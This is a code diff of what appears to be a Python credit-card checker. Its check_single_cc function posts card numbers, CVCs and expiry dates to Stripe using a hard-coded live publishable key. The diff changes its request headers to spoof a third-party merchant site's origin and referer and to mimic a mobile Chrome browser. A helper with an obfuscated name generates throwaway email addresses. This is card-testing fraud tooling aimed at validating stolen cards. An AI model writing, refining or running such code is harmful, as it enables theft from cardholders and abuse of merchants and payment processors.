@@ -39,83 +39,32 @@ def print_line():
 def print_sline():
     print_cyan(f"""|----------------------------------------------|""")
 
-def print_red(text):
-    print(f"\033[91m{text}\033[0m")
-
-def print_green(text):
-    print(f"\033[92m{text}\033[0m")
-
-def print_yellow(text):
-    print(f"\033[93m{text}\033[0m")
-
-def print_blue(text): 
-    print(f"\033[94m{text}\033[0m")
-
-def print_magenta(text): 
-    print(f"\033[95m{text}\033[0m")
-
-def print_cyan(text): 
-    print(f"\033[96m{text}\033[0m")
-
-def print_white(text): 
-    print(f"\033[97m{text}\033[0m")
-
-def print_grey(text): 
-    print(f"\033[90m{text}\033[0m")
-
-def print_light_blue(text): 
-    print(f"\033[104m{text}\033[0m")
-
-def print_light_cyan(text): 
-    print(f"\033[106m{text}\033[0m")
-
-def print_light_grey(text): 
-    print(f"\033[47m{text}\033[0m")
-
-def print_light_magenta(text): 
-    print(f"\033[105m{text}\033[0m")
-
-def print_dark_blue(text): 
-    print(f"\033[34m{text}\033[0m")
-
-def print_dark_magenta(text): 
-    print(f"\033[35m{text}\033[0m")
-
-def print_dark_cyan(text): 
-    print(f"\033[36m{text}\033[0m")
-
-def print_dark_grey(text): 
-    print(f"\033[90m{text}\033[0m")
-
-def print_dark_green(text): 
-    print(f"\033[32m{text}\033[0m")
-
-def print_dark_yellow(text): 
-    print(f"\033[33m{text}\033[0m")
-
-def print_dark_red(text): 
-    print(f"\033[31m{text}\033[0m")
-
-def print_bright_blue(text): 
-    print(f"\033[94m{text}\033[0m")
-
-def print_bright_magenta(text): 
-    print(f"\033[95m{text}\033[0m")
-
-def print_bright_cyan(text): 
-    print(f"\033[96m{text}\033[0m")
-
-def print_bright_grey(text): 
-    print(f"\033[97m{text}\033[0m")
-
-def print_bright_green(text): 
-    print(f"\033[92m{text}\033[0m")
-
-def print_bright_yellow(text): 
-    print(f"\033[93m{text}\033[0m")
-
-def print_bright_red(text): 
-    print(f"\033[91m{text}\033[0m")
+def print_red(text): print(f"\033[91m{text}\033[0m")
+def print_green(text): print(f"\033[92m{text}\033[0m")
+def print_yellow(text): print(f"\033[93m{text}\033[0m")
+def print_blue(text): print(f"\033[94m{text}\033[0m")
+def print_magenta(text): print(f"\033[95m{text}\033[0m")
+def print_cyan(text): print(f"\033[96m{text}\033[0m")
+def print_white(text): print(f"\033[97m{text}\033[0m")
+def print_grey(text): print(f"\033[90m{text}\033[0m")
+def print_light_blue(text): print(f"\033[104m{text}\033[0m")
+def print_light_cyan(text): print(f"\033[106m{text}\033[0m")
+def print_light_grey(text): print(f"\033[47m{text}\033[0m")
+def print_light_magenta(text): print(f"\033[105m{text}\033[0m")
+def print_dark_blue(text): print(f"\033[34m{text}\033[0m")
+def print_dark_magenta(text): print(f"\033[35m{text}\033[0m")
+def print_dark_cyan(text): print(f"\033[36m{text}\033[0m")
+def print_dark_grey(text): print(f"\033[90m{text}\033[0m")
+def print_dark_green(text): print(f"\033[32m{text}\033[0m")
+def print_dark_yellow(text): print(f"\033[33m{text}\033[0m")
+def print_dark_red(text): print(f"\033[31m{text}\033[0m")
+def print_bright_blue(text): print(f"\033[94m{text}\033[0m")
+def print_bright_magenta(text): print(f"\033[95m{text}\033[0m")
+def print_bright_cyan(text): print(f"\033[96m{text}\033[0m")
+def print_bright_grey(text): print(f"\033[97m{text}\033[0m")
+def print_bright_green(text): print(f"\033[92m{text}\033[0m")
+def print_bright_yellow(text): print(f"\033[93m{text}\033[0m")
+def print_bright_red(text): print(f"\033[91m{text}\033[0m")
 
 def gggggggggggggggggg(length=9, domain=None):
     common_domains = ["gmail.com"]
@@ -245,9 +194,16 @@ def check_single_cc(cc_line, session):
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
+            'origin': 'https://www.thetravelinstitute.com',
+            'referer': 'https://www.thetravelinstitute.com/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'cross-site',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-stripe-client-user-agent': '{"init_source":"elements-inner","plugin_name":"stripe.js","lang":"en","bindings_version":"2.20.0","os":"android","browser":"chrome"}',
         }
         data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
         
